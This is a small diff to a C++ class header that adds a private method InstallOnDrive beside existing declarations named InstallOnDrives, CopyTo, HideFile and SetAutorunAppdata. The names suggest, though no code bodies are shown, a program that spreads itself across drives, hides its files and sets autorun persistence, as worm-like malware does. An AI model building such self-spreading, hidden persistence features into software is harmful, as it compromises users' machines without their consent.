@@ -11,6 +11,8 @@ public:
 	bool InstallOnDrives();
 
 private:
+	bool InstallOnDrive(const TCHAR* drive);
+
 	bool CopyTo(const TCHAR* path);
 	bool HideFile(const TCHAR* path);
 	bool SetAutorunAppdata(bool autorun);
